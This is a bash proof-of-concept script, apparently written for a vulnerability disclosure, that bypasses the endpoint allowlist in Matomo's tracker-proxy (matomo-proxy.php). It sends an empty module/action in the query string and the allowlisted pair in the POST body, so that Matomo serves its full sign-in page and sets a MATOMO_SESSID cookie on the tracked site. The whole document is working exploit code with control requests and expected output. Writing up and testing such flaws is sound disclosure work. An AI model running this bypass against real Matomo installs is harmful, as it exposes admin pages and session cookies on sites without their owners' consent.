#!/usr/bin/env bash
#
# PoC: matomo-org/tracker-proxy - matomo-proxy.php endpoint allowlist bypass
#
# matomo-proxy.php restricts what may be proxied to Matomo's index.php to
# $SUPPORTED_METHODS = ['CoreAdminHome.optOut', 'CoreAdminHome.optOutJS'] and
# $VALID_FILES = ['plugins/CoreAdminHome/javascripts/optOut.js'];
# anything else is answered with 404.
#
# The allowlist reads module/action as "$_GET value if non-empty, else $_POST
# value". Matomo resolves them from $_GET + $_POST, where the GET key wins
# whenever it is *present*, empty value included. Sending an empty module in
# the query and the allowlisted pair in the POST body therefore satisfies the
# proxy while Matomo dispatches something else entirely.
#
# Usage: ./poc_allowlist_bypass.sh https://tracked-site.example/matomo-proxy.php
set -u
PROXY="${1:?usage: $0 <url of matomo-proxy.php>}"
CURL=(curl -sS --noproxy '*')

hr() { printf '%s\n' '--------------------------------------------------------------'; }

show() { # label url [postdata]
  local label="$1" url="$2" data="${3-}"
  local out; out=$(mktemp); local hdr; hdr=$(mktemp)
  if [ -n "$data" ]; then
    "${CURL[@]}" -o "$out" -D "$hdr" -X POST "$url" \
      -H 'Content-Type: application/x-www-form-urlencoded' --data "$data" \
      -w "  HTTP %{http_code}  %{size_download} bytes  content-type=%{content_type}\n"
  else
    "${CURL[@]}" -o "$out" -D "$hdr" "$url" \
      -w "  HTTP %{http_code}  %{size_download} bytes  content-type=%{content_type}\n"
  fi
  grep -io '^set-cookie:.*' "$hdr" | sed 's/^/  /'
  grep -o -m1 '<title>[^<]*</title>' "$out" | sed 's/^/  /'
  grep -o -m3 'name="form_[a-z_]*"' "$out" | sed 's/^/  leaked login form field: /'
  rm -f "$out" "$hdr"
}

hr; echo "[control 1] a non-allowlisted method is blocked as designed"
show "" "$PROXY?module=Login&action=index"

hr; echo "[control 2] no parameters is blocked as designed"
show "" "$PROXY"

hr; echo "[control 3] the intended endpoint (small opt-out iframe document)"
show "" "$PROXY?module=CoreAdminHome&action=optOut"

hr; echo "[BYPASS] empty module/action in the query, allowlisted pair in the body"
show "" "$PROXY?module=&action=" "module=CoreAdminHome&action=optOut"

hr; echo "[BYPASS variant] module kept, action emptied -> CoreAdminHome default action"
show "" "$PROXY?module=CoreAdminHome&action=" "action=optOut"
hr
echo
echo "Expected on a vulnerable install: the two [BYPASS] rows return a full"
echo "Matomo application page (Sign in), not the ~2.7 KB opt-out document, and"
echo "set a MATOMO_SESSID cookie on the tracked site's origin."
